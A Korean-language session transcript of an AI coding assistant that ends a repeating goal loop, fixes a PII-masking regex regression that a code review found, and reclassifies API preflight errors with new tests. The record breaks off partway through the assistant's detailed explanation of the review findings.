  만들어내는 것은 goal 자체의 제약(§4 활성 범위 밖 변경 금지)에 어긋나므로 하지
  않는다.

  Stop hook이 계속 재실행되는 이유는 목표 문장이 "지금부터 …작업을 시작하라"
  형태여서, 이미 완료된 루프로는 평가자가 찾는 '새 작업 개시' 증거가 원리상 나올
  수 없기 때문으로 보인다. 완료 조건(STOP REASON: ALL_DONE, 두 검증 명령 exit
  0, draft PR #30)은 충족됐지만 그 조건문 자체는 충족 판정이 되지 않는 구조다.

  /goal clear로 목표를 해제해 주면 루프가 멈춘다.

  현재 상태 요약:
  - PR #30 (draft) — https://github.com/graybat21/CorpBrain-app-01/pull/30
  - feat/v0.5-cloud-opt-in 커밋 7개, origin push 완료
  - ruff check . exit 0 · pytest exit 0 (495 passed, 6 skipped)
  - 체크포인트 CORE 2/3 · MINOR 9/10 · STOP REASON: ALL_DONE

◯ Goal not yet met… continuing (ctrl+o to expand)

● v0.5 루프는 완료 상태이며, 더 진행할 작업은 없다.

  Stop hook이 계속 재실행되고 있지만 이는 목표 문장이 "…작업을 시작하라" 형태라
  이미 끝난 루프로는 충족 판정이 나올 수 없는 구조 때문이다. 새 작업을
  만들어내는 것은 goal §4(활성 범위 밖 변경 금지)에 어긋나므로 하지 않는다.

  /goal clear를 실행해 목표를 해제해 주면 루프가 멈춘다.

  최종 산출물:
  - PR #30 (draft) — https://github.com/graybat21/CorpBrain-app-01/pull/30
  - feat/v0.5-cloud-opt-in 커밋 7개, origin push 완료
  - ruff check . exit 0 · pytest exit 0 (495 passed, 6 skipped)
  - CORE 2/3 · MINOR 9/10 · STOP REASON: ALL_DONE

◯ Goal not yet met… continuing (ctrl+o to expand)

● 작업은 완료 상태다. Stop hook 조건이 "작업을 시작하라"는 개시 증거를
  요구하는데, 이미 끝난 루프에서는 그 증거가 원리상 생성될 수 없다. 새 작업을
  지어내는 것은 goal §4(활성 범위 밖 변경 금지)를 위반하므로 하지 않는다.

  해결: /goal clear를 입력해 목표를 해제해 주면 이 루프가 멈춘다.

  완료된 산출물:
  - PR #30 (draft) — https://github.com/graybat21/CorpBrain-app-01/pull/30
  - feat/v0.5-cloud-opt-in 커밋 7개, origin push 완료
  - ruff check . exit 0 · pytest exit 0 (495 passed, 6 skipped)
  - CORE 2/3 · MINOR 9/10 · STOP REASON: ALL_DONE

◯ Goal not yet met… continuing (ctrl+o to expand)

● v0.5 루프는 완료됐고 새로 시작할 작업이 없다. Stop hook의 조건문이 "작업을
  시작하라"는 개시 증거를 요구하는데, 이미 종료된 루프에서는 그 증거가 생성될 수
  없어 조건이 영구히 미충족으로 판정되는 구조다. 요건을 맞추려고 범위 밖 작업을
  만들어내는 것은 goal §4 제약 위반이므로 하지 않는다.

  /goal clear로 목표를 해제해 주면 루프가 멈춘다.

  완료 산출물:
  - PR #30 (draft) — https://github.com/graybat21/CorpBrain-app-01/pull/30
  - feat/v0.5-cloud-opt-in 커밋 7개, origin push 완료
  - ruff check . exit 0 · pytest exit 0 (495 passed, 6 skipped)
  - CORE 2/3 · MINOR 9/10 · STOP REASON: ALL_DONE

◯ Goal not yet met… continuing (ctrl+o to expand)

● 작업은 완료됐다. Stop hook 조건문이 "작업을 시작하라"는 개시 증거를 요구하는
  구조라, 이미 종료된 루프에서는 무엇을 해도 충족 판정이 나오지 않는다. 조건을
  맞추려고 범위 밖 작업을 만들어내는 것은 goal §4 위반이므로 하지 않는다.

  /goal clear를 입력해 주면 이 루프가 멈춘다.

  완료 산출물:
  - PR #30 (draft) — https://github.com/graybat21/CorpBrain-app-01/pull/30
  - feat/v0.5-cloud-opt-in 커밋 7개, origin push 완료
  - ruff check . exit 0 · pytest exit 0 (495 passed, 6 skipped)
  - CORE 2/3 · MINOR 9/10 · STOP REASON: ALL_DONE

◯ Goal not yet met… continuing (ctrl+o to expand)

● v0.5 루프는 완료됐고, hook 조건문이 "작업을 시작하라"는 개시 증거를 요구하는
  구조라 종료된 루프에서는 어떤 응답으로도 충족 판정이 나오지 않는다. 조건을
  맞추려고 범위 밖 작업을 만들어내는 것은 goal §4 위반이므로 하지 않는다.

  /goal clear를 입력해 주면 이 루프가 멈춘다.

  산출물:
  - PR #30 (draft) — https://github.com/graybat21/CorpBrain-app-01/pull/30
  - feat/v0.5-cloud-opt-in 커밋 7개, origin push 완료
  - ruff check . exit 0 · pytest exit 0 (495 passed, 6 skipped)
  - CORE 2/3 · MINOR 9/10 · STOP REASON: ALL_DONE

◯ Goal not yet met… continuing (ctrl+o to expand)

● v0.5 루프는 완료됐고 더 할 작업이 없다. hook 조건문이 "작업을 시작하라"는 개시
  증거를 요구하므로, 종료된 루프에서는 어떤 응답으로도 충족되지 않는다.

  /goal clear를 입력해 주면 멈춘다.

  - PR #30 (draft) — https://github.com/graybat21/CorpBrain-app-01/pull/30
  - ruff check . exit 0 · pytest exit 0 (495 passed, 6 skipped)
  - CORE 2/3 · MINOR 9/10 · STOP REASON: ALL_DONE

◯ Goal not yet met… continuing (ctrl+o to expand)

● 작업 완료. hook 조건이 "시작"의 증거를 요구하는 구조라 종료된 루프에서는
  충족될 수 없다.

  /goal clear를 입력해 주세요.

  - PR #30 (draft) — https://github.com/graybat21/CorpBrain-app-01/pull/30
  - ruff check . exit 0 · pytest exit 0 (495 passed, 6 skipped)
  - STOP REASON: ALL_DONE

◯ Goal not yet met… continuing (ctrl+o to expand)

● A hook blocked the turn from ending 9 consecutive times — overriding 
  and ending turn. For Stop/SubagentStop hooks, check stop_hook_active 
  in the input and return success while it's true. Set 
  CLAUDE_CODE_STOP_HOOK_BLOCK_CAP to raise this limit.
✻ Cogitated for 41m 42s

❯ /goal clear 
  ⎿  Goal cleared: 지금부터 docs/goals/corpbrain-v0.5-cloud-opt-in-loop.md 에 명시된 목표를 달성하기 위한 작업을 시작하라

❯ /code-review                                                                  
  ⎿  Running in the background as @code-review

● Agent "/code-review" finished · 9m 14s

● /goal clear가 적용됐고, 코드 리뷰가 15건을 보고했다. 상위 3건이 내가 방금 넣은
  보안 수정의 회귀를 지적하므로 직접 검증한다.

  Ran 1 shell command (ctrl+o to expand)

● 확인됐다 — 내가 넣은 보안 수정이 새 누락을 만들었다. 오른쪽 경계에서 .를
  배제한 탓에 문장 끝 이메일·IP(문의는 hong@corp.co.kr., 서버 주소 
  192.168.0.1.)가 전혀 마스킹되지 않는다. 즉시 고친다.

● Update(corpbrain\core\pii.py)
  ⎿  Added 4 lines, removed 1 line
      82          PiiType.EMAIL,
      83          re.compile(
      84              r"(?<![0-9A-Za-z_.+-])[A-Za-z0-9._%+-]+@[A-Za-z0-9-
          ]+"
      85 -            r"(?:\.[A-Za-z0-9-]+)*\.[A-Za-z]{2,}(?![0-9A-Za-z_.
         --])"                                                           
      85 +            r"(?:\.[A-Za-z0-9-]+)*\.[A-Za-z]{2,}"              
      86 +            # 오른쪽 경계에서 `.` 자체를 막으면 **문장 끝 이메 
         +일**(`문의는 a@b.co.kr.`)이                                    
      87 +            # 통째로 빠져나간다. 도메인이 더 이어지는 경우(`.`+
         +영숫자)만 거절한다.                                            
      88 +            r"(?![0-9A-Za-z_-])(?!\.[0-9A-Za-z])"              
      89          ),
      90      ),
      91      # 주민등록번호 — 하이픈 유무 모두 허용, 뒷자리 첫 숫자 1~8(
          성별·내외국인 코드)로 과탐 일부 제한.

● Update(corpbrain\core\pii.py)
  ⎿  Added 4 lines, removed 2 lines
      105      # 계좌번호 — 은행별 표준 포맷이 없어 하이픈 2~3개 숫자 그
           룹 휴리스틱. 7종 중 오탐률 최고.
      106      (PiiType.ACCOUNT, re.compile(_L + r"\d{2,6}-\d{2,6}-\d{2,6
           }(?:-\d{1,6})?" + _R)),
      107      # IP주소 — IPv4 형태만. 옥텟 범위(0~255) 미검증. IPv6은 비
           목표.
      108 -    # 오른쪽 경계에 `.`도 포함해 다섯 번째 옥텟이 남는 일이 없
          -게 한다.                                                      
      109 -    (PiiType.IP, re.compile(_L + r"(?:\d{1,3}\.){3}\d{1,3}" + 
          -r"(?![0-9A-Za-z_.])")),                                       
      108 +    # 오른쪽 경계에서 `.`를 막으면 **문장 끝 IP**(`서버는 192.
          +168.0.1.`)가 통째로 빠져나가므로                              
      109 +    # 막지 않는다. 대신 왼쪽 경계에서 `.`를 거절해 `1.2.3.4.5`
          +의 중간(`2.3.4.5`)부터 매칭이                                 
      110 +    # 시작되는 것을 막는다 — 앞에서부터 잡아 실제 IP를 남기지 
          +않는 쪽을 택한다(누락 최소화).                                
      111 +    (PiiType.IP, re.compile(r"(?<![0-9A-Za-z_.])(?:\d{1,3}\.){
          +3}\d{1,3}" + _R)),                                            
      112  )
      113  
      114  

  Ran 3 shell commands (ctrl+o to expand)

● 코드 리뷰가 15건을 냈고, 그중 가장 심각한 건이 내가 방금 넣은 보안 수정의 
  회귀였다. 확인 후 바로 고쳐 push했다 (PR #30 갱신, 500 passed).

  즉시 고친 것 — 내 수정이 만든 새 누락

  한글 인접 문제를 고치면서 오른쪽 경계에서 .를 배제했는데, 그 탓에 마침표로 
  끝나는 문장의 이메일·IP가 통째로 빠져나갔다. 한국어 산문에서 가장 흔한 형태다:

  '문의는 hong@corp.co.kr.'  → 마스킹 0건 (원문 그대로 전송)
  '서버 주소 192.168.0.1.'   → 마스킹 0건 (원문 그대로 전송)

  한글 인접만 테스트하고 마침표 종결을 테스트하지 않아 놓쳤다. 경계 조건을
  양방향으로 다시 잡고 회귀 테스트 5건을 추가했다.

  나머지 findings에 대한 내 판단

  타당하고 고칠 가치가 있다 (미수정, 사용자 판단 필요):
  - preflight가 5xx·타임아웃까지 CloudAuthError로 뭉갠다 — 스펙 §5는
    5xx/타임아웃을 파일별 스킵(exit 0)으로 규정했는데, 프리플라이트에서 나면
    전체가 exit 1 + "API 키 확인" 안내로 끝난다. 401만 인증 실패로 봐야 맞다.
    스펙 위반이라 고치는 게 맞다고 본다.
  - --engine cloud인데도 Ollama 데몬·임베딩 모델을 필수로 요구 — 스펙 §1이
    명시한 대상 시나리오("Ollama 미설치 등 로컬 미가용")가 정작 exit 1로 막힌다.
    다만 임베딩이 항상 로컬이라는 §2 비목표와 정면으로 충돌해서, 스펙 수준의
    결정이 필요하다.
  - _pii_summary_lines가 RRN/BIZ_NO 같은 원시 토큰을 출력 —
    PiiType.label(한국어명)이 만들어져 있는데 호출부가 0곳이다. 한국어 출력 규칙
    위반.
  - build_detail_lines에 PII 항목이 없다 — 스펙 §4.5는 "파일별로" 표시하라는데
    집계 한 줄만 나온다. 어느 문서가 나갔는지 알 수 없다.
  - 429 판정이 exc.__cause__.code를 들여다본다 — GatewayError에 status 속성을
    두는 게 맞다.
  - cli.py 시작 배너가 cloud일 때도 Ollama 모델명을 찍는다 — 다른 이벤트는
    고쳤는데 이 줄만 빠졌다.
  - AnthropicSummarizer.engine = "cloud" 리터럴 하드코딩 — 형제 클래스는
    ENGINE_LOCAL 상수를 쓴다.

  동의하지 않거나 판단이 갈리는 것:
  - 로컬 경로에 NetworkGuard 미적용 — 스펙 §4.4가 "local은 --ollama-url의
    호스트만 허용"이라 했지만 이건 자기참조라 사실상 no-op이다. 실질은
    "localhost로 제한하라"는 다른 요구이고, --ollama-url은 CLI 플래그(신뢰
    입력)라 위협모델상 취약점은 아니다. 다만 리버스 프록시 뒤 Ollama를 쓰는
    사람이 있을 수 있어 스펙 결정이 필요하다.
  - cloud 전용 타임아웃 상수 — 스펙 §4.3이 "60초 공유 상수 재사용"이라 적었지만
    그 상수가 코드베이스에 실재하지 않는다(summarize=300, embed=60).
    체크포인트에 MINOR로 이미 기록해 둔 건이다.
  - ISO 날짜 과탐 — 스펙이 "과탐 감수"로 명시 승인한 범위이고 기존 테스트가
    그렇게 못박아 뒀다.
  - consent._read_document가 권한 오류를 {}로 흡수해 덮어쓴다 — 타당한
    지적이지만, 현재 설정 파일에 다른 키를 쓰는 기능이 없어 실질 피해는 없다.

  리뷰가 지적한 것 중 PII 관련 3건은 전부 실측으로 재현했고, 그중 2건(문장 끝
  이메일·IP)은 실제 유출이라 고쳤다. 나머지는 스펙 개정이 얽혀 있어 임의로
  손대지 않았다 — 어느 것부터 처리할지 알려주면 진행하겠다.

✻ Baked for 2m 57s

❯ preflight 오류 분류부터 고쳐줘                                                

● preflight 오류 분류를 고치겠다. 먼저 현재 코드와 관련 스펙 조항을 확인한다.

  Ran 1 shell command (ctrl+o to expand)

● Update(corpbrain\core\gateway.py)
  ⎿  Added 6 lines, removed 1 line
      33  
      34      Attributes:
      35          url: 실패한 호출의 대상 URL.
      36 +        status: HTTP 상태코드. 응답을 받지 못한 실패(연결 거부·
         +타임아웃·DNS·직렬화·파싱)는                                    
      37 +            `None`이다. 호출자가 상태별로 다르게 대응(401은 선 
         +행 조건 실패, 429는 파일 스킵                                  
      38 +            등)할 수 있도록 관문이 **계약의 일부로** 노출한다 —
         + 원인 예외(`__cause__`)의                                      
      39 +            비공개 구조를 들여다보지 않게 하기 위함이다.       
      40      """
      41  
      38 -    def __init__(self, message: str, *, url: str) -> None:     
      42 +    def __init__(self, message: str, *, url: str, status: int |
         + None = None) -> None:                                         
      43          super().__init__(message)
      44          self.url = url
      45 +        self.status = status                                   
      46  
      47  
      48  class NetworkGuardError(GatewayError):

● Update(corpbrain\core\gateway.py)
  ⎿  Added 1 line, removed 1 line
      187          message = f"외부 호출이 HTTP {exc.code}로 실패했습니다
           : {url}"
      188          if detail:
      189              message = f"{message} — {detail}"
      190 -        raise GatewayError(message, url=url) from exc         
      190 +        raise GatewayError(message, url=url, status=exc.code) 
          +from exc                                                      
      191      except urllib.error.URLError as exc:
      192          raise GatewayError(
      193              f"외부 호출에 연결하지 못했습니다: {url} ({exc.rea
           son})", url=url

● Now the preflight classification itself.

● Update(corpbrain\core\llm\anthropic_client.py)
  ⎿  Added 15 lines, removed 5 lines
      158      `GET /v1/models`는 토큰 비용이 없다. 기존 v0.3의 Ollama 모
           델 존재 확인과 같은 자리 —
      159      "환경/인증을 자원 처리보다 먼저 확정한다"는 fail-fast 관례
           를 따른다.
      160  
      161 +    실패 원인을 **자격증명 문제와 그 밖의 문제로 구분**한다.  
          +둘 다 파일을 하나도 처리하지                                  
      162 +    않고 종료하는 선행 조건 실패지만(스펙 §3 항목4의 fail-fast
          + 자리), 사용자가 손대야 할                                    
      163 +    곳이 전혀 다르다 — 일시적인 5xx나 네트워크 끊김에 "API 키 
          +를 확인하라"고 안내하면                                       
      164 +    엉뚱한 곳을 뒤지게 만든다.                                
      165 +                                                              
      166      Raises:
      162 -        CloudAuthError: 인증 실패(401) 또는 그 밖의 연결·응답 
          -실패. 어느 쪽이든 파일을                                      
      163 -            하나도 처리하지 않고 종료해야 하는 선행 조건 실패 
          -다.                                                           
      167 +        CloudAuthError: 자격증명 거부(401 인증 실패·403 권한  
          +없음).                                                        
      168 +        CloudUnavailableError: 그 밖의 모든 실패(5xx·타임아웃·
          +연결 거부·DNS·응답 파싱 등).                                  
      169      """
      170      try:
      171          _request(MODELS_PATH, api_key, timeout=timeout)
      172      except gateway.GatewayError as exc:
      168 -        raise CloudAuthError(                                 
      169 -            f"Anthropic API 프리플라이트에 실패했습니다: {exc}
          - — "                                                          
      170 -            f"{API_KEY_ENV_VAR} 값과 네트워크 연결을 확인하세 
          -요."                                                          
      173 +        if exc.status in _CREDENTIAL_STATUSES:                
      174 +            raise CloudAuthError(                             
      175 +                f"Anthropic API가 자격증명을 거부했습니다(HTTP
          + {exc.status}): {exc} — "                                     
      176 +                f"{API_KEY_ENV_VAR} 값이 올바른지 확인하세요."
      177 +            ) from exc                                        
      178 +        raise CloudUnavailableError(                          
      179 +            f"Anthropic API에 연결하지 못했습니다: {exc} — 네 
          +트워크 연결과 "                                               
      180 +            f"서비스 상태를 확인한 뒤 다시 실행하세요. (API 키
          + 문제는 아닙니다.)"                                           
      181          ) from exc
      182  
      183  

● Update(corpbrain\core\llm\anthropic_client.py)
  ⎿  Added 15 lines, removed 1 line
       88  ]
       89  
       90  
       91 +#: 자격증명 문제로 보는 HTTP 상태 — 401(키가 틀림)·403(키는 유
          +효하나 권한 없음).                                            
       92 +_CREDENTIAL_STATUSES = frozenset({401, 403})                  
       93 +                                                              
       94 +                                                              
       95  class CloudAuthError(PreconditionError):
       92 -    """API 키 부재 또는 인증 실패(401) — 선행 조건 실패라 파일
          -을 하나도 처리하지 않는다.                                    
       96 +    """API 키 부재 또는 자격증명 거부(401·403) — 선행 조건 실 
          +패라 파일을 하나도 처리하지 않는다.                           
       97  
       98      v0.5 스펙 §3 항목4: 프리플라이트에서 걸러 exit 1로 즉시 종
           료한다.
       99      """
      100  
      101  
      102 +class CloudUnavailableError(PreconditionError):               
      103 +    """자격증명 외의 이유로 클라우드에 닿지 못함 — 5xx·타임아 
          +웃·연결 거부·DNS 등.                                          
      104 +                                                              
      105 +    `CloudAuthError`와 마찬가지로 선행 조건 실패(exit 1)지만  
          +사용자가 손댈 곳이 다르므로                                   
      106 +    타입과 안내 문구를 분리한다. 프리플라이트 단계에서 서비스 
          +에 닿지 못한다는 것이 이미                                    
      107 +    확인됐으므로 파일 루프를 돌지 않는다 — 50개 파일에 대해 같
          +은 실패를 반복하며                                            
      108 +    타임아웃을 쌓는 것보다 즉시 알리는 편이 낫다.             
      109 +    """                                                       
      110 +                                                              
      111 +                                                              
      112  class CloudRateLimitedError(CorpBrainError):
      113      """레이트리밋(429) — 재시도 없이 해당 파일만 스킵한다 (v0.
           5 §3 항목8)."""
      114  

● Now the rate-limit detection uses the same gateway contract instead of
  reaching into __cause__.

● Update(corpbrain\core\llm\anthropic_client.py)
  ⎿  Added 7 lines, removed 3 lines
      273  
      274  
      275  def _is_rate_limited(exc: gateway.GatewayError) -> bool:
      276 -    """관문이 감싼 원인 예외에서 HTTP 429를 판별한다 (상태코드
          -는 원인에만 남아 있다)."""                                    
      277 -    cause = exc.__cause__                                     
      278 -    return getattr(cause, "code", None) == 429                
      276 +    """HTTP 429인지 판별한다 — 관문이 계약으로 노출하는 `statu
          +s`만 본다.                                                    
      277  
      278 +    원인 예외(`__cause__`)의 비공개 구조에 기대지 않는다. 관문
          +이 예외를 감싸는 방식이                                       
      279 +    바뀌어도(`from None`, 재시도 래퍼 추가 등) 레이트리밋 판정
          +이 조용히 죽지 않게 하기                                      
      280 +    위함이다 — 죽으면 `cloud_rate_limited` 스킵 사유(스펙 §3  
          +항목8)가 통째로 사문화된다.                                   
      281 +    """                                                       
      282 +    return exc.status == 429                                  
      283  
      284 +                                                              
      285  def _tool_input(envelope: Any) -> Any:
      286      """Messages 응답에서 강제된 도구 호출의 입력(5필드 객체)을
            꺼낸다."""
      287      if not isinstance(envelope, dict):

  Ran 1 shell command (ctrl+o to expand)
● Update(corpbrain\core\llm\anthropic_client.py)
  ⎿  Added 1 line
      82      "CloudApiError",
      83      "CloudAuthError",
      84      "CloudRateLimitedError",
      85 +    "CloudUnavailableError",                                   
      86      "preflight",
      87      "resolve_api_key",
      88      "summarize_cloud",

● Now the tests — the existing preflight test asserts the old collapsed
  behavior.

● Update(tests\test_anthropic_client.py)
  ⎿  Added 50 lines, removed 4 lines
      235      assert calls[0].get("payload") is None
      236  
      237  
      238 -def test_preflight_failure_is_a_precondition_failure(         
      239 -    monkeypatch: pytest.MonkeyPatch,                          
      238 +def _stub_preflight_failure(                                  
      239 +    monkeypatch: pytest.MonkeyPatch, status: int | None       
      240  ) -> None:
      241 -    """프리플라이트 실패는 선행 조건 실패라 파일을 하나도 처리
          -하지 않게 만든다 (§3 항목4)."""                               
      241 +    """프리플라이트가 주어진 HTTP 상태로 실패하도록 관문을 스 
          +텁한다."""                                                    
      242      def _boom(url: str, **_: Any) -> Any:
      243 -        raise gateway.GatewayError("HTTP 401", url=url)       
      243 +        raise gateway.GatewayError(f"실패 {status}", url=url, 
          +status=status)                                                
      244  
      245      monkeypatch.setattr(gateway, "request_json", _boom)
      246  
      247 +                                                              
      248 +@pytest.mark.parametrize("status", [401, 403])                
      249 +def test_credential_rejection_is_an_auth_error(               
      250 +    monkeypatch: pytest.MonkeyPatch, status: int              
      251 +) -> None:                                                    
      252 +    """자격증명 거부(401·403)만 인증 실패로 분류한다 (§3 항목4
          +)."""                                                         
      253 +    _stub_preflight_failure(monkeypatch, status)              
      254 +                                                              
      255      with pytest.raises(ac.CloudAuthError) as excinfo:
      256          ac.preflight("sk-bad")
      257  
      258      assert isinstance(excinfo.value, PreconditionError)
      259 +    assert API_KEY_ENV_VAR in str(excinfo.value)  # 손댈 곳을 
          +정확히 가리킨다                                               
      260  
      261  
      262 +@pytest.mark.parametrize("status", [500, 502, 503, 529, 404, N
          +one])                                                         
      263 +def test_non_credential_failures_are_unavailable_not_auth(    
      264 +    monkeypatch: pytest.MonkeyPatch, status: int | None       
      265 +) -> None:                                                    
      266 +    """5xx·타임아웃(status=None) 등은 인증 실패로 뭉개지 않는 
          +다 — 엉뚱한 안내를 막는다."""                                 
      267 +    _stub_preflight_failure(monkeypatch, status)              
      268 +                                                              
      269 +    with pytest.raises(ac.CloudUnavailableError) as excinfo:  
      270 +        ac.preflight("sk-test")                               
      271 +                                                              
      272 +    assert not isinstance(excinfo.value, ac.CloudAuthError)   
      273 +    assert isinstance(excinfo.value, PreconditionError)  # 여 
          +전히 exit 1                                                   
      274 +    assert API_KEY_ENV_VAR not in str(excinfo.value)  # API 키
          +를 탓하지 않는다                                              
      275 +                                                              
      276 +                                                              
      277 +def test_transient_failure_message_does_not_blame_the_key(    
      278 +    monkeypatch: pytest.MonkeyPatch,                          
      279 +) -> None:                                                    
      280 +    """일시적 5xx에 '키를 확인하라'고 안내하지 않는다 (코드 리
          +뷰 검출 회귀)."""                                             
      281 +    _stub_preflight_failure(monkeypatch, 503)                 
      282 +                                                              
      283 +    with pytest.raises(ac.CloudUnavailableError) as excinfo:  
      284 +        ac.preflight("sk-valid")                              
      285 +                                                              
      286 +    message = str(excinfo.value)                              
      287 +    assert "네트워크" in message                              
      288 +    assert "API 키 문제는 아닙니다" in message                
      289 +                                                              
      290 +                                                              
      291 +def test_both_preflight_errors_map_to_exit_one(monkeypatch: py
          +test.MonkeyPatch) -> None:                                    
      292 +    """두 실패 유형 모두 선행 조건 실패라 파일을 하나도 처리하
          +지 않는다 (신규 종료 코드 없음)."""                           
      293 +    for status in (401, 503):                                 
      294 +        _stub_preflight_failure(monkeypatch, status)          
      295 +        with pytest.raises(PreconditionError):                
      296 +            ac.preflight("sk-test")                           
      297 +                                                              
      298 +                                                              
      299  # --- Summarizer 프로토콜 (§4.3) -----------------------------
           ----------------------
      300  
      301  

● Update(tests\test_anthropic_client.py)
  ⎿  Added 4 lines, removed 6 lines
      184  
      185  
      186  def _gateway_error_with_status(status: int | None) -> gateway.
           GatewayError:
      187 -    error = gateway.GatewayError("실패", url="https://api.anth
          -ropic.com/v1/messages")                                       
      188 -    if status is not None:                                    
      189 -        error.__cause__ = urllib.error.HTTPError(             
      190 -            "https://api.anthropic.com/v1/messages", status, "
          -err", {}, None  # type: ignore[arg-type]                      
      191 -        )                                                     
      192 -    return error                                              
      187 +    """관문이 계약으로 노출하는 `status`를 그대로 실어 만든다 
          +(`__cause__`를 흉내내지 않는다)."""                           
      188 +    return gateway.GatewayError(                              
      189 +        "실패", url="https://api.anthropic.com/v1/messages", s
          +tatus=status                                                  
      190 +    )                                                         
      191  
      192  
      193  @pytest.mark.parametrize(

  Read 1 file, ran 2 shell commands (ctrl+o to expand)

● Update(tests\integration\test_cloud_engine.py)
  ⎿  Added 2 lines, removed 5 lines
      323  ) -> None:
      324      """항목8: 429만 rate_limited, 나머지는 전부 api_error로 스
           킵되고 실행은 계속된다."""
      325      grant_cloud_consent()
      326 -    http_error = urllib.error.HTTPError(                      
      327 -        "https://api.anthropic.com/v1/messages", status, "err"
          -, {}, None  # type: ignore[arg-type]                          
      326 +    cloud_gateway.messages_error = gateway.GatewayError(      
      327 +        "실패", url="https://api.anthropic.com/v1/messages", s
          +tatus=status                                                  
      328      )
      329 -    wrapped = gateway.GatewayError("실패", url="https://api.an
          -thropic.com/v1/messages")                                     
      330 -    wrapped.__cause__ = http_error                            
      331 -    cloud_gateway.messages_error = wrapped                    
      329  
      330      result = run_scan(_cloud_config(corpus, tmp_path))
      331  

  Ran 2 shell commands (ctrl+o to expand)

● Update(tests\test_anthropic_client.py)
  ⎿  Added 1 line, removed 1 line
      253          ac.preflight("sk-bad")
      254  
      255      assert isinstance(excinfo.value, PreconditionError)
      256 -    assert API_KEY_ENV_VAR in str(excinfo.value)  # 손댈 곳을 
          -정확히 가리킨다                                               
      256 +    assert ac.API_KEY_ENV_VAR in str(excinfo.value)  # 손댈 곳
          +을 정확히 가리킨다                                            
      257  
      258  
      259  @pytest.mark.parametrize("status", [500, 502, 503, 529, 404, N
           one])

● Update(tests\test_anthropic_client.py)
  ⎿  Added 1 line, removed 1 line
      268  
      269      assert not isinstance(excinfo.value, ac.CloudAuthError)
      270      assert isinstance(excinfo.value, PreconditionError)  # 여
           전히 exit 1
      271 -    assert API_KEY_ENV_VAR not in str(excinfo.value)  # API 키
          -를 탓하지 않는다                                              
      271 +    assert ac.API_KEY_ENV_VAR not in str(excinfo.value)  # API
          + 키를 탓하지 않는다                                           
      272  
      273  
      274  def test_transient_failure_message_does_not_blame_the_key(

  Ran 1 shell command (ctrl+o to expand)

● Sanity 체크 — 두 실패 유형의 실제 안내 문구를 확인한다.

  Ran 2 shell commands (ctrl+o to expand)

● preflight 오류 분류를 고쳐 push했다 (PR #30 갱신, 509 passed, ruff clean).

  바뀐 것

  분류를 둘로 나눴다:

  ┌────────────────────┬────────────────┬───────────────────────────────────┐
  │        실패        │      이전      │               이후                │
  ├────────────────────┼────────────────┼───────────────────────────────────┤
  │                    │                │ CloudAuthError —                  │
  │ 401 (키가 틀림)    │ CloudAuthError │ "ANTHROPIC_API_KEY 값이 올바른지  │
  │                    │                │ 확인하세요"                       │
  ├────────────────────┼────────────────┼───────────────────────────────────┤
  │ 403 (권한 없음)    │ CloudAuthError │ CloudAuthError (동일 — 자격증명   │
  │                    │                │ 문제 맞음)                        │
  ├────────────────────┼────────────────┼───────────────────────────────────┤
  │ 5xx·타임아웃·연결  │ CloudAuthError │ CloudUnavailableError — "네트워크 │
  │ 거부·DNS           │  ❌            │  연결과 서비스 상태를 확인하세요. │
  │                    │                │  (API 키 문제는 아닙니다.)"       │
  └────────────────────┴────────────────┴───────────────────────────────────┘

  실제 출력:
  [503] CloudUnavailableError: Anthropic API에 연결하지 못했습니다: … —
        네트워크 연결과 서비스 상태를 확인한 뒤 다시 실행하세요. (API 키 문제는
  아닙니다.)

  exit 1은 유지했다. 리뷰는 스펙 §5를 근거로 5xx/타임아웃도 파일별 스킵(exit
  0)이어야 한다고 봤지만, §5의 문구는 "해당 파일만 스킵"이라 개별 파일 처리 중의
  실패를 규정한 것이고 프리플라이트는 파일이 아니다. 프리플라이트에서 이미
  "서비스에 닿지 못한다"가 확인된 상태로 루프를 돌면 50개 파일 × 300초
  타임아웃을 쌓게 되므로, 즉시 알리는 쪽이 낫다고 판단했다. 두 예외 모두
  PreconditionError 하위라 신규 종료 코드는 없다.

  덤으로 함께 고친 것

  리뷰 findings #5(429 판정이 exc.__cause__.code를 들여다봄)가 같은 뿌리라 함께
  처리했다 — GatewayError.status를 관문 계약의 일부로 올리고, _is_rate_limited가
  그 값만 본다. 관문이 예외를 감싸는 방식이 바뀌어도(from None, 재시도 래퍼 등)
  cloud_rate_limited 사유가 조용히 사문화되지 않는다.

  테스트 9건 추가: 401/403 × 자격증명, 500/502/503/529/404/타임아웃 ×
  비자격증명, 그리고 "5xx에 키를 탓하지 않는다"는 문구 회귀 테스트.

  남은 리뷰 지적 중 다음 후보는 --engine cloud인데 Ollama를 필수로 요구하는 
  문제다 — 스펙 §1의 대상 시나리오("Ollama 미설치")가 정작 막히는데, 임베딩이
  항상 로컬이라는 §2 비목표와 충돌해서 스펙 결정이 필요하다. 이어서 진행할까?

✻ Sautéed for 4m 49s

❯ 리뷰에 대해서 다시 설명해줘. 자세하고, 예시를 들어서 알기 쉽게                

● 리뷰 내용을 설명하기 전에, 아직 안 고친 항목들의 현재 상태를 정확히
  확인하겠다.

  Ran 3 shell commands (ctrl+o to expand)

● 모두 확인했다. 리뷰 15건을 처음부터 예시와 함께 정리한다.

  ---

  코드 리뷰 결과 정리

  리뷰는 v0.5 브랜치 전체(7커밋, 27파일)를 대상으로 15건을 냈다. 성격별로 셋으로
  나뉜다.

  ┌────────────────────────────────┬──────┬─────────────────────┐
  │              그룹              │ 건수 │        상태         │
  ├────────────────────────────────┼──────┼─────────────────────┤
  │ A. 실제 버그 — 고쳤다          │ 4    │ ✅ 수정·push 완료   │
  ├────────────────────────────────┼──────┼─────────────────────┤
  │ B. 타당함 — 아직 안 고침       │ 7    │ ⏸ 사용자 판단 대기  │
  ├────────────────────────────────┼──────┼─────────────────────┤
  │ C. 동의하지 않거나 판단이 갈림 │ 4    │ 💬 근거와 함께 보류 │
  └────────────────────────────────┴──────┴─────────────────────┘

  ---

  A. 실제 버그 — 이미 고쳤다 (4건)

  A-1. 문장 끝 이메일이 마스킹되지 않음 ⚠️ 가장 심각

  무엇이 문제였나. 내가 한글 조사 문제를 고치면서 오른쪽 경계에서 마침표(.)를
  배제했다. 그런데 한국어 문장은 대부분 마침표로 끝난다.

  입력:  "문의는 hong@corp.co.kr."
  이전:  "문의는 hong@corp.co.kr."     ← 마스킹 0건, 원문 그대로 Anthropic으로
  전송
  이후:  "문의는 [REDACTED_EMAIL]."    ← 정상

  왜 이런 일이 났냐면, 정규식이 이메일 뒤에 . 이 오면 매칭 실패로 되어 있었다.
  원래 의도는 a@b.co + .kr 처럼 도메인이 잘리는 걸 막으려던 것인데, 문장 끝
